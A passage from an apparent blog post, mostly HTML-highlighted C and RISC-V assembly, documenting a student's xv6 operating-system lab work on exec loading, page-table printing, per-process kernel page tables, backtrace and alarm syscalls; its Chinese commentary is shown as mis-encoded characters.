class="title">ip</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proghdr</span> <span class="title">ph</span>;</span></span><br><span class="line">  <span class="keyword">pagetable_t</span> pagetable = <span class="number">0</span>, oldpagetable;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  begin_op();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((ip = namei(path)) == <span class="number">0</span>)&#123;</span><br><span class="line">    end_op();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ilock(ip);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check ELF header</span></span><br><span class="line">  <span class="keyword">if</span>(readi(ip, <span class="number">0</span>, (uint64)&amp;elf, <span class="number">0</span>, <span class="keyword">sizeof</span>(elf)) != <span class="keyword">sizeof</span>(elf))</span><br><span class="line">    <span class="keyword">goto</span> bad;</span><br><span class="line">  <span class="keyword">if</span>(elf.magic != ELF_MAGIC)</span><br><span class="line">    <span class="keyword">goto</span> bad;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((pagetable = proc_pagetable(p)) == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> bad;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Load program into memory.</span></span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>, off=elf.phoff; i&lt;elf.phnum; i++, off+=<span class="keyword">sizeof</span>(ph))&#123;</span><br><span class="line">    <span class="keyword">if</span>(readi(ip, <span class="number">0</span>, (uint64)&amp;ph, off, <span class="keyword">sizeof</span>(ph)) != <span class="keyword">sizeof</span>(ph))</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    <span class="keyword">if</span>(ph.type != ELF_PROG_LOAD)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span>(ph.memsz &lt; ph.filesz)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    <span class="keyword">if</span>(ph.vaddr + ph.memsz &lt; ph.vaddr)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    uint64 sz1;</span><br><span class="line">    <span class="keyword">if</span>((sz1 = uvmalloc(pagetable, sz, ph.vaddr + ph.memsz)) == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    sz = sz1;</span><br><span class="line">    <span class="keyword">if</span>(ph.vaddr % PGSIZE != <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    <span class="keyword">if</span>(loadseg(pagetable, ph.vaddr, ip, ph.off, ph.filesz) &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">  &#125;</span><br><span class="line">  iunlockput(ip);</span><br><span class="line">  end_op();</span><br><span class="line">  ip = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  p = myproc();</span><br><span class="line">  uint64 oldsz = p-&gt;sz;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Allocate two pages at the next page boundary.</span></span><br><span class="line">  <span class="comment">// Use the second as the user stack.</span></span><br><span class="line">  sz = PGROUNDUP(sz);</span><br><span class="line">  uint64 sz1;</span><br><span class="line">  <span class="keyword">if</span>((sz1 = uvmalloc(pagetable, sz, sz + <span class="number">2</span>*PGSIZE)) == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> bad;</span><br><span class="line">  sz = sz1;</span><br><span class="line">  uvmclear(pagetable, sz<span class="number">-2</span>*PGSIZE);</span><br><span class="line">  sp = sz;</span><br><span class="line">  stackbase = sp - PGSIZE;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Push argument strings, prepare rest of stack in ustack.</span></span><br><span class="line">  <span class="keyword">for</span>(argc = <span class="number">0</span>; argv[argc]; argc++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(argc &gt;= MAXARG)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    sp -= <span class="built_in">strlen</span>(argv[argc]) + <span class="number">1</span>;</span><br><span class="line">    sp -= sp % <span class="number">16</span>; <span class="comment">// riscv sp must be 16-byte aligned</span></span><br><span class="line">    <span class="keyword">if</span>(sp &lt; stackbase)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    <span class="keyword">if</span>(copyout(pagetable, sp, argv[argc], <span class="built_in">strlen</span>(argv[argc]) + <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    ustack[argc] = sp;</span><br><span class="line">  &#125;</span><br><span class="line">  ustack[argc] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// push the array of argv[] pointers.</span></span><br><span class="line">  sp -= (argc+<span class="number">1</span>) * <span class="keyword">sizeof</span>(uint64);</span><br><span class="line">  sp -= sp % <span class="number">16</span>;</span><br><span class="line">  <span class="keyword">if</span>(sp &lt; stackbase)</span><br><span class="line">    <span class="keyword">goto</span> bad;</span><br><span class="line">  <span class="keyword">if</span>(copyout(pagetable, sp, (<span class="keyword">char</span> *)ustack, (argc+<span class="number">1</span>)*<span class="keyword">sizeof</span>(uint64)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> bad;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// arguments to user main(argc, argv)</span></span><br><span class="line">  <span class="comment">// argc is returned via the system call return</span></span><br><span class="line">  <span class="comment">// value, which goes in a0.</span></span><br><span class="line">  p-&gt;trapframe-&gt;a1 = sp;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Save program name for debugging.</span></span><br><span class="line">  <span class="keyword">for</span>(last=s=path; *s; s++)</span><br><span class="line">    <span class="keyword">if</span>(*s == <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">      last = s+<span class="number">1</span>;</span><br><span class="line">  safestrcpy(p-&gt;name, last, <span class="keyword">sizeof</span>(p-&gt;name));</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// Commit to the user image.</span></span><br><span class="line">  oldpagetable = p-&gt;pagetable;</span><br><span class="line">  p-&gt;pagetable = pagetable;</span><br><span class="line">  p-&gt;sz = sz;</span><br><span class="line">  p-&gt;trapframe-&gt;epc = elf.entry;  <span class="comment">// initial program counter = main</span></span><br><span class="line">  p-&gt;trapframe-&gt;sp = sp; <span class="comment">// initial stack pointer</span></span><br><span class="line">  proc_freepagetable(oldpagetable, oldsz);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> argc; <span class="comment">// this ends up in a0, the first argument to main(argc, argv)</span></span><br><span class="line"></span><br><span class="line"> bad:</span><br><span class="line">  <span class="keyword">if</span>(pagetable)</span><br><span class="line">    proc_freepagetable(pagetable, sz);</span><br><span class="line">  <span class="keyword">if</span>(ip)&#123;</span><br><span class="line">    iunlockput(ip);</span><br><span class="line">    end_op();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Print-a-page-table"><a href="#Print-a-page-table" class="headerlink" title="Print a page table"></a>Print a page table</h3><p>æ‰“å°é¡µè¡¨,å†™çš„æ¯”è¾ƒè„‘ç˜«</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> _vmprint(<span class="keyword">pagetable_t</span> pagetable,<span class="keyword">int</span> level)&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">512</span>;i++)&#123;</span><br><span class="line">    <span class="keyword">pte_t</span> pte=pagetable[i];</span><br><span class="line">    <span class="keyword">if</span>(!(pte&amp;PTE_V))&#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(level==<span class="number">1</span>)&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(level==<span class="number">2</span>)&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;.. ..&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(level==<span class="number">3</span>)&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;.. .. ..&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d: %p pa %p\n&quot;</span>,i,pte,PTE2PA(pte));</span><br><span class="line">    <span class="keyword">if</span>((pte&amp;(PTE_X|PTE_W|PTE_R))==<span class="number">0</span>)&#123;</span><br><span class="line">      uint64 child=PTE2PA(pte);</span><br><span class="line">      _vmprint((<span class="keyword">pagetable_t</span>)child,level+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vmprint</span><span class="params">(<span class="keyword">pagetable_t</span> pagetable)</span></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;page table %p\n&quot;</span>,pagetable);</span><br><span class="line">  _vmprint(pagetable,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="A-kernel-page-table-per-process"><a href="#A-kernel-page-table-per-process" class="headerlink" title="A kernel page table per process"></a>A kernel page table per process</h3><p>ç»™æ¯ä¸ªè¿›ç¨‹å®ç°ä¸€ä¸ªå†…æ ¸é¡µè¡¨çš„å‰¯æœ¬ï¼Œåªè¦ç†æ¸…æ€è·¯å°±ä¸éš¾ï¼Œç„¶åä»£ç å®ç°ä»¿ç…§å†…æ ¸å·²æœ‰çš„å‡½æ•°å†™å°±è¡Œï¼Œæˆ‘ä¸»è¦æ˜¯å¡åœ¨äº†<code>scheduler()</code>å‡½æ•°ä¸Šï¼Œæ­£ç¡®å‡½æ•°è°ƒç”¨é¡ºåºå¦‚ä¸‹,ä½†æ˜¯æˆ‘åˆšå¼€å§‹å§<code>uvminithart</code>å†™åœ¨äº†<code>swtch</code>å‡½æ•°çš„ä¸‹é¢ï¼Œç›®å‰å¹¶ä¸æ¸…æ¥šè¿™ä¸ªå‡½æ•°æ˜¯å¹²å•¥çš„ï¼Œä½†æ˜¯æŒ‰ç…§è¿™æ ·å†™å°±æ²¡é—®é¢˜</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uvminithart(p-&gt;kernelpage);</span><br><span class="line"></span><br><span class="line">swtch(&amp;c-&gt;context, &amp;p-&gt;context);</span><br><span class="line"></span><br><span class="line">kvminithart();</span><br></pre></td></tr></table></figure>

<p>ä¸»è¦ä»£ç å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">proc_kernelpage_free</span><span class="params">(<span class="keyword">pagetable_t</span> kernelpage)</span></span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">512</span>;i++)&#123;</span><br><span class="line">    <span class="keyword">pte_t</span> pte=kernelpage[i];</span><br><span class="line">    <span class="keyword">if</span>(!(pte&amp;PTE_V))&#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>((pte&amp;(PTE_W|PTE_R|PTE_X))==<span class="number">0</span>)&#123;</span><br><span class="line">      uint64 child=PTE2PA(pte);</span><br><span class="line">      proc_kernelpage_free((<span class="keyword">pagetable_t</span>)child);</span><br><span class="line">    &#125;</span><br><span class="line">    kernelpage[i]=<span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  kfree((<span class="keyword">void</span> *)kernelpage);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uvmmap</span><span class="params">(<span class="keyword">pagetable_t</span> kernelpage,uint64 va, uint64 pa, uint64 sz, <span class="keyword">int</span> perm)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(mappages(kernelpage,va,sz,pa,perm)!=<span class="number">0</span>)&#123;</span><br><span class="line">    panic(<span class="string">&quot;uvmmap&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">pagetable_t</span> <span class="title">proc_kvminit</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">pagetable_t</span> kernlepage=(<span class="keyword">pagetable_t</span>) kalloc();</span><br><span class="line">  <span class="built_in">memset</span>(kernlepage,<span class="number">0</span>,PGSIZE);</span><br><span class="line"></span><br><span class="line">  uvmmap(kernlepage,UART0, UART0, PGSIZE, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  uvmmap(kernlepage,VIRTIO0, VIRTIO0, PGSIZE, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  uvmmap(kernlepage,CLINT, CLINT, <span class="number">0x10000</span>, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  uvmmap(kernlepage,PLIC, PLIC, <span class="number">0x400000</span>, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  uvmmap(kernlepage,KERNBASE, KERNBASE, (uint64)etext-KERNBASE, PTE_R | PTE_X);</span><br><span class="line"></span><br><span class="line">  uvmmap(kernlepage,(uint64)etext, (uint64)etext, PHYSTOP-(uint64)etext, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  uvmmap(kernlepage,TRAMPOLINE, (uint64)trampoline, PGSIZE, PTE_R | PTE_X);</span><br><span class="line">  <span class="keyword">return</span> kernlepage;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Simplify-copyin-copyinstr"><a href="#Simplify-copyin-copyinstr" class="headerlink" title="Simplify copyin/copyinstr"></a>Simplify <code>copyin</code>/<code>copyinstr</code></h3><p>ä»£ç å¤ªå¤šäº†ï¼ŒæŠŠæ¡çš„ä¸æ˜¯å¾ˆå¥½ï¼ŒåŠ ä¸Šæ²¡æœ‰å–„äºåˆ©ç”¨git,å¯¼è‡´æˆ‘ç¬¬äºŒä¸ªå®éªŒåšå®Œæ²¡æœ‰å¼€ä¿å­˜åˆ°å·¥ä½œåŒºï¼Œæœ€åå®éªŒä¸‰æ”¹ç€æ”¹ç€å°±æ”¹ä¸å›æ¥äº†ï¼Œæˆ‘åˆšå¼€å§‹çš„æ€è·¯å°±æ˜¯ç”¨æˆ·é¡µè¡¨æ˜ å°„çš„æ—¶å€™å†…æ ¸é¡µè¡¨ä¹Ÿè·Ÿç€æ˜ å°„å—ï¼Œä½†æ˜¯æœ€åæ˜¯å¤±è´¥çš„ï¼Œå› ä¸ºforkå®Œåè°ƒç”¨execä¼šå¯¼è‡´å¯¹å†…æ ¸é¡µè¡¨çš„é‡æ–°æ˜ å°„è€Œå¯¼è‡´å‡ºé”™ï¼Œè¿›è€Œç¨‹åºå´©æºƒï¼Œåæ¥çœ‹äº†åˆ«äººçš„æ€è·¯ï¼Œå°±æ˜¯ä¸åˆ©ç”¨å†…æ ¸æä¾›çš„å‡½æ•°ï¼Œè€Œæ˜¯è‡ªå·±å†™ä¸€ä¸ªå‡½æ•°ï¼Œæ¥å¤åˆ¶é¡µè¡¨ï¼Œè¿™æ ·ç¡®å®ä¼šå¥½å¾ˆå¤šï¼Œå“ã€‚çŒªé¼»äº†è¿™ä¸‹ã€‚åªèƒ½ä»å¤´å¼€å§‹å†™è¿™ä¸ªå®éªŒäº†ã€‚</p>
<p>æ•´äº†å››äº”å¤©è¿˜æ˜¯ç–¯ç‹‚æŠ¥é”™ã€‚æˆ‘åäº†ï¼Œç…§ç€å†™ä»£ç éƒ½ä¸è¡Œï¼Œè¿™ä¸ªå®éªŒåªèƒ½æš‚æ—¶ææµ…äº†ï¼Œåé¢æœ‰æ—¶é—´å†æ•´å§ã€‚</p>
<h2 id="Lab4-traps"><a href="#Lab4-traps" class="headerlink" title="Lab4: traps"></a>Lab4: traps</h2><h3 id="RISC-V-assembly"><a href="#RISC-V-assembly" class="headerlink" title="RISC-V assembly"></a>RISC-V assembly</h3><p>ä»»åŠ¡å°±æ˜¯è¯»æ‡‚è¿™æ®µæ±‡ç¼–ï¼Œä½†æ˜¯ä¹‹é—´æ²¡æœ‰è®¤çœŸæ¥è§¦è¿‡risc-væŒ‡ä»¤é›†ï¼Œæ‰€ä»¥è¿˜æ˜¯æœ‰äº›å°å›°éš¾ï¼Œä¸ºäº†å½»åº•ææ‡‚ï¼Œå°±ä»mainå¤„ä¸€è¡Œä¸€è¡Œçœ‹å§ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">int g(int x) &#123;</span><br><span class="line">   0:	1141                	addi	sp,sp,-16</span><br><span class="line">   2:	e422                	sd	s0,8(sp)</span><br><span class="line">   4:	0800                	addi	s0,sp,16</span><br><span class="line">  return x+3;</span><br><span class="line">&#125;</span><br><span class="line">   6:	250d                	addiw	a0,a0,3</span><br><span class="line">   8:	6422                	ld	s0,8(sp)</span><br><span class="line">   a:	0141                	addi	sp,sp,16</span><br><span class="line">   c:	8082                	ret</span><br><span class="line"></span><br><span class="line">000000000000000e &lt;f&gt;:</span><br><span class="line"></span><br><span class="line">int f(int x) &#123;</span><br><span class="line">   e:	1141                	addi	sp,sp,-16</span><br><span class="line">  10:	e422                	sd	s0,8(sp)</span><br><span class="line">  12:	0800                	addi	s0,sp,16</span><br><span class="line">  return g(x);</span><br><span class="line">&#125;</span><br><span class="line">  14:	250d                	addiw	a0,a0,3</span><br><span class="line">  16:	6422                	ld	s0,8(sp)</span><br><span class="line">  18:	0141                	addi	sp,sp,16</span><br><span class="line">  1a:	8082                	ret</span><br><span class="line"></span><br><span class="line">000000000000001c &lt;main&gt;:</span><br><span class="line"></span><br><span class="line">void main(void) &#123;</span><br><span class="line">  1c:	1141                	addi	sp,sp,-16</span><br><span class="line">  #sp=sp+0x10</span><br><span class="line">  1e:	e406                	sd	ra,8(sp)</span><br><span class="line">  # *(sp+0x8)=ra</span><br><span class="line">  20:	e022                	sd	s0,0(sp)</span><br><span class="line">  #*(sp+0x0)=s0,s0ç›¸å½“äºx86ä¸­çš„rbpæˆ‘æ„Ÿè§‰ï¼Œå°±æ˜¯è®°å½•æ ˆé¡¶çš„å€¼ï¼Œå³å¸§æŒ‡é’ˆ</span><br><span class="line">  22:	0800                	addi	s0,sp,16</span><br><span class="line">  #s0=sp+0x10,å°±æ˜¯è®°å½•è¿™ä¸ªå‡½æ•°çš„å¸§æŒ‡é’ˆ</span><br><span class="line">  printf(&quot;%d %d\n&quot;, f(8)+1, 13);</span><br><span class="line">  24:	4635                	li	a2,13</span><br><span class="line">  #a2=13</span><br><span class="line">  26:	45b1                	li	a1,12</span><br><span class="line">  #a1=12</span><br><span class="line">  28:	00000517          	auipc	a0,0x0</span><br><span class="line">  #a0=(0x0&lt;&lt;12)+pc</span><br><span class="line">  #auipc rd, imm # å°† 20 ä½çš„ç«‹å³æ•°å·¦ç§»12ä½ï¼Œä½ 12 ä½è¡¥é›¶ï¼Œå°†å¾—åˆ°çš„ 32 ä½æ•°ä¸ pc çš„å€¼ç›¸åŠ ï¼Œæœ€åå†™å›å¯„å­˜å™¨ rd ä¸­</span><br><span class="line">  2c:	7a850513          	addi	a0,a0,1960 # 7d0 &lt;malloc+0xea&gt;</span><br><span class="line">  #a0=a0+1960,æ­¤æ—¶a0å°±å­˜å‚¨ç€å­—ç¬¦ä¸²çš„åœ°å€äº†ã€‚ï¼Œæ„Ÿè§‰å°±æ˜¯ç›¸å¯¹äºpcçš„å¯»å€ï¼Œåªä¸è¿‡æ‹†æˆäº†ä¸¤æ­¥</span><br><span class="line">  30:	00000097          	auipc	ra,0x0</span><br><span class="line">  #ra=(0x0&lt;&lt;12)+pc</span><br><span class="line">  34:	5f8080e7          	jalr	1528(ra) # 628 &lt;printf&gt;</span><br><span class="line">  #pc=ra+1528, ra+=8,æ­¤æ—¶å°±è·³è½¬åˆ°äº†printfå‡½æ•°</span><br><span class="line">  exit(0);</span><br><span class="line">  38:	4501                	li	a0,0</span><br><span class="line">  #a0=0</span><br><span class="line">  3a:	00000097          	auipc	ra,0x0</span><br><span class="line">  #ra=pc</span><br><span class="line">  3e:	276080e7          	jalr	630(ra) # 2b0 &lt;exit&gt;</span><br><span class="line">  #pc=ra+630,ra+=8</span><br></pre></td></tr></table></figure>

<p>ä¸€è¡Œä¸€è¡Œåˆ†æä¸‹æ¥å‘ç°å…¶å®å¹¶æ²¡æœ‰è°ƒç”¨få’Œgå‡½æ•°ï¼Œè¢«ç¼–è¯‘å™¨ä¼˜åŒ–æ‰äº†ï¼Œç›´æ¥æŠŠ12èµ‹å€¼ç»™a1,13èµ‹å€¼ç»™a2äº†ã€‚</p>
<p>é—®é¢˜</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">å“ªäº›å¯„å­˜å™¨ä¿å­˜å‡½æ•°çš„å‚æ•°ï¼Ÿä¾‹å¦‚ï¼Œåœ¨mainå¯¹printfçš„è°ƒç”¨ä¸­ï¼Œå“ªä¸ªå¯„å­˜å™¨ä¿å­˜13ï¼Ÿ</span><br><span class="line">a2</span><br><span class="line">mainçš„æ±‡ç¼–ä»£ç ä¸­å¯¹å‡½æ•°fçš„è°ƒç”¨åœ¨å“ªé‡Œï¼Ÿå¯¹gçš„è°ƒç”¨åœ¨å“ªé‡Œ(æç¤ºï¼šç¼–è¯‘å™¨å¯èƒ½ä¼šå°†å‡½æ•°å†…è”ï¼‰</span><br><span class="line">å¹¶æ²¡æœ‰å¯¹få’Œgå‡½æ•°è¿›è¡Œè°ƒç”¨</span><br><span class="line">printfå‡½æ•°ä½äºå“ªä¸ªåœ°å€ï¼Ÿ</span><br><span class="line">0x628</span><br><span class="line">åœ¨mainä¸­printfçš„jalrä¹‹åçš„å¯„å­˜å™¨raä¸­æœ‰ä»€ä¹ˆå€¼ï¼Ÿ</span><br><span class="line">0x38</span><br><span class="line">è¿è¡Œä»¥ä¸‹ä»£ç ã€‚</span><br><span class="line">unsigned int i = 0x00646c72;</span><br><span class="line">printf(&quot;H%x Wo%s&quot;, 57616, &amp;i);</span><br><span class="line">He110 World</span><br><span class="line">åœ¨ä¸‹é¢çš„ä»£ç ä¸­ï¼Œâ€œy=â€ä¹‹åå°†æ‰“å°ä»€ä¹ˆ(æ³¨ï¼šç­”æ¡ˆä¸æ˜¯ä¸€ä¸ªç‰¹å®šçš„å€¼ï¼‰ï¼Ÿä¸ºä»€ä¹ˆä¼šå‘ç”Ÿè¿™ç§æƒ…å†µï¼Ÿ</span><br><span class="line">printf(&quot;x=%d y=%d&quot;, 3);</span><br><span class="line">ä¸ç¡®å®šï¼Œå› ä¸ºå‚æ•°ä¸‰å¹¶æ²¡æœ‰è¢«æŒ‡å®šï¼Œæ‰€ä»¥æ­¤æ—¶a2å¯„å­˜å™¨æ˜¯ä»€ä¹ˆå€¼å°±è¾“å‡ºä»€ä¹ˆå€¼</span><br></pre></td></tr></table></figure>

<h3 id="Backtrace"><a href="#Backtrace" class="headerlink" title="Backtrace"></a>Backtrace</h3><p>å°±æ˜¯åˆ©ç”¨s0å’Œraæ¥æ‰“å°å›æº¯å‡½æ•°é“¾</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backtrace</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  uint64 s0=r_fp();</span><br><span class="line">  uint64 kstack_base=PGROUNDDOWN(s0)+<span class="number">0x1000</span>;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,*(uint64 *)(s0<span class="number">-0x8</span>));</span><br><span class="line">    s0=*(uint64 *)(s0<span class="number">-0x10</span>);</span><br><span class="line">    <span class="keyword">if</span>(s0&gt;=kstack_base)&#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Alarm"><a href="#Alarm" class="headerlink" title="Alarm"></a>Alarm</h3><p>è™½ç„¶æ˜¯å›°éš¾çº§åˆ«çš„ï¼Œä½†æ˜¯æ„Ÿè§‰æ¯”é¡µè¡¨é‚£å—çš„å®éªŒè¦å‹å–„å¾ˆå¤šäº†ï¼Œå°±æ˜¯å¯¹alarmç†è§£çš„æœ‰ç‚¹åå·®ï¼Œå¯¼è‡´å¡äº†ä¸€ä¼šä¼šã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint64 <span class="title">sys_sigalarm</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>=</span>myproc();</span><br><span class="line">  p-&gt;alarm_handler=(<span class="keyword">void</span> *)p-&gt;trapframe-&gt;a1;</span><br><span class="line">  p-&gt;alarm_total_time=p-&gt;trapframe-&gt;a0;</span><br><span class="line">  p-&gt;trapframe-&gt;a0=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">uint64 <span class="title">sys_sigreturn</span><span class="params">(<span 